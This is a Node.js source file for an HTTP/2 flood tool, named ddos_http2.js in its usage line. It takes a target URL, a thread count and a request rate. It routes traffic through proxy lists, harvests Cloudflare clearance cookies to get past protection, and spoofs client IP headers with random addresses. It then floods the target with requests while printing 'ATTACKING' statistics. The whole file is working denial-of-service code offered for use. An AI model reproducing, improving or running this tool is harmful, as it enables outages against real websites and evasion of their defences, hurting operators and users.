const http2 = require('http2');
const fs = require('fs');
const url = require('url');
const axios = require('axios');
const { URL } = require('url');
const net = require('net');
const os = require('os');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

// --- Configuration ---
const HTTP_METHODS = ["GET"];
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.69 Safari/537.36",
    // Add more modern UAs
];
const REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/search?q=",
    // Add more search engines
];

// --- Helper Functions ---
function loadProxies(proxyFile) {
    try {
        if (!proxyFile) return [];
        const data = fs.readFileSync(proxyFile, 'utf8');
        return data.trim().split('\n').filter(Boolean).map(proxy => {
            if (!proxy.startsWith('http://') && !proxy.startsWith('https://')) {
                return `http://${proxy}`;
            }
            return proxy;
        }).filter(proxy => {
            try {
                new URL(proxy);
                return proxy;
            } catch (err) {
                return false;
            }
        });
    } catch (err) {
        return [];
    }
}

function getRandomUserAgent() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getRandomReferer() {
    return REFERRERS[Math.floor(Math.random() * REFERRERS.length)];
}

// --- Cloudflare Bypass ---
async function fetchCloudflareCookie(url) {
    const headers = {
        'User-Agent': getRandomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'close'
    };
    try {
        const response = await axios.get(url, { headers, timeout: 5000 });
        const cookies = response.headers['set-cookie'];
        if (cookies) {
            return cookies
                .filter(cookie => cookie.startsWith('__cfduid=') || cookie.startsWith('cf_clearance='))
                .map(cookie => cookie.split(';')[0])
                .join('; ');
        }
        return null;
    } catch (error) {
        return null;
    }
}

// --- Proxy Tunneling ---
function createProxyTunnel(proxyUrl, targetUrl) {
    return new Promise((resolve, reject) => {
        const proxySocket = net.createConnection({
            host: proxyUrl.hostname,
            port: proxyUrl.port
        }, () => {
            const connectRequest = `CONNECT ${targetUrl.hostname}:${targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80)} HTTP/1.1\r\n` +
                `Host: ${targetUrl.hostname}:${targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80)}\r\n` +
                `\r\n`;
            proxySocket.write(connectRequest);
        });

        let response = '';
        proxySocket.on('data', (chunk) => {
            response += chunk.toString();
            if (response.includes('\r\n\r\n')) {
                const statusLine = response.split('\r\n')[0];
                const statusCode = parseInt(statusLine.split(' ')[1], 10);
                if (statusCode === 200) {
                    resolve(proxySocket);
                } else {
                    reject(new Error(`Proxy CONNECT failed with status ${statusLine}`));
                }
            }
        });

        proxySocket.on('error', reject);
    });
}

// --- HTTP/2 Attack Worker ---
async function attackHttp2(parsedUrl, duration, proxy, cfCookie, rate) {
    const startTime = Date.now();
    const endTime = startTime + duration * 1000;
    let requestCount = 0;

    const protocol = parsedUrl.protocol === 'https:' ? 'https' : 'http';
    const host = parsedUrl.hostname;
    const port = parsedUrl.port || (protocol === 'https' ? 443 : 80);

    while (Date.now() < endTime) {
        try {
            let client;
            if (proxy) {
                const proxyUrl = new URL(proxy);
                if (proxyUrl.protocol === 'http:') {
                    const tunnelSocket = await createProxyTunnel(proxyUrl, parsedUrl);
                    client = http2.connect(parsedUrl.href, { socket: tunnelSocket });
                } else if (proxyUrl.protocol === 'https:') {
                    const clientSettings = {
                        maxSessionMemory: 1024 * 1024 * 8192, // 8GB
                        enablePush: false,
                        settings: {
                            headerTableSize: 65536,
                            maxConcurrentStreams: 100000, // Max HTTP/2 streams
                            maxHeaderListSize: 262144
                        }
                    };
                    client = http2.connect(parsedUrl.href, clientSettings);
                }
            } else {
                const clientSettings = {
                    maxSessionMemory: 1024 * 1024 * 8192, // 8GB
                    enablePush: false,
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 100000,
                        maxHeaderListSize: 262144
                    }
                };
                client = http2.connect(parsedUrl.href, clientSettings);
            }

            client.on('error', (err) => {
                client.destroy();
            });

            while (Date.now() < endTime) {
                const method = HTTP_METHODS[0];
                const path = parsedUrl.pathname || '/';
                const userAgent = getRandomUserAgent();
                const referer = getRandomReferer();

                const headers = {
                    ':method': method,
                    ':path': path,
                    ':authority': host,
                    'user-agent': userAgent,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'dnt': '1',
                    'cache-control': 'no-cache',
                    'referer': referer
                };

                if (cfCookie) {
                    headers['cookie'] = cfCookie;
                }

                headers['x-forwarded-for'] = Math.floor(Math.random() * 255) + '.' +
                    Math.floor(Math.random() * 255) + '.' +
                    Math.floor(Math.random() * 255) + '.' +
                    Math.floor(Math.random() * 255);
                headers['x-real-ip'] = headers['x-forwarded-for'];

                const req = client.request(headers);

                req.on('response', (responseHeaders) => {
                    requestCount++;
                    const rps = (requestCount / ((Date.now() - startTime) / 1000)).toFixed(2);
                    process.stdout.write(`\r[THREAD] ATTACKING: ${host} | Method: ${method} | Status: ${responseHeaders[':status']} | Req: ${requestCount} | RPS: ${rps}`);
                });

                req.on('error', (err) => {
                    // Silent error handling
                });

                req.end();

                // Corrected rate calculation: 1000 / rate = delay per request
                const delay = 1000 / rate; // 1000 RPS per thread
                await new Promise(resolve => setTimeout(resolve, delay + Math.random() * 20));
            }
        } catch (err) {
            await new Promise(resolve => setTimeout(resolve, 3000 + Math.random() * 3000));
        }
    }

    return requestCount;
}

// --- Multi-Threaded Execution ---
async function launchMultiThreadedAttack(targetUrl, duration, proxyFile, threads, rate) {
    let parsedUrl;
    try {
        parsedUrl = new URL(targetUrl);
    } catch (err) {
        console.error(`[ERROR] Invalid target URL: ${targetUrl}`);
        process.exit(1);
    }

    const proxies = loadProxies(proxyFile);
    const workingProxies = proxies.filter(proxy => {
        try {
            new URL(proxy);
            return proxy;
        } catch (err) {
            return false;
        }
    });

    console.log(`[INFO] ${workingProxies.length} working proxies found.`);

    let cfCookie = await fetchCloudflareCookie(targetUrl);

    console.log(`\n[INFO] Starting ${threads} parallel HTTP/2 threads against ${targetUrl}`);

    const attackPromises = [];
    for (let i = 0; i < threads; i++) {
        const proxy = workingProxies.length > 0 ? workingProxies[i % workingProxies.length] : null;
        attackPromises.push(attackHttp2(parsedUrl, duration, proxy, cfCookie, rate));
    }

    const results = await Promise.all(attackPromises);
    const totalRequests = results.reduce((sum, count) => sum + count, 0);
    const finalRPS = (totalRequests / duration).toFixed();

    console.log(`\n[INFO] Total Requests: ${totalRequests} | Final RPS: ${finalRPS}`);
    process.exit(0);
}

// --- Main Execution ---
if (isMainThread) {
    const args = process.argv.slice(2);
    if (args.length < 4) {
        console.log(`Usage: node ddos_http2.js <url> <durasi> <threads> <rate> <proxyfileopsional>`);
        process.exit(1);
    }

    const TARGET_URL = args[0];
    const DURATION = parseInt(args[1]) || 60;
    const THREADS = parseInt(args[2]) || 200; // Threads = 200
    const RATE = parseInt(args[3]) || 10; // Rate = 50 RPS per thread (200 * 50 = 10,000 RPS)
    const PROXY_FILE = args[4] || null;

    launchMultiThreadedAttack(TARGET_URL, DURATION, PROXY_FILE, THREADS, RATE)
        .catch(err => {
            console.error(`[FATAL] ${err.message}`);
            process.exit(1);
        });

    // Refresh Cloudflare Cookie every 3 minutes
    setInterval(async () => {
        if (TARGET_URL) {
            const newCookie = await fetchCloudflareCookie(TARGET_URL);
            if (newCookie) {
                console.log(`[INFO] Refreshed Cloudflare Cookie: ${newCookie}`);
            }
        }
    }, 180000);

    // Graceful Shutdown
    process.on('SIGINT', () => {
        console.log("\n[INFO] Gracefully shutting down...");
        process.exit(0);
    });
} else {
    // Worker thread logic (if needed)
    parentPort.on('message', (msg) => {
        // Handle worker-specific tasks
    });
}
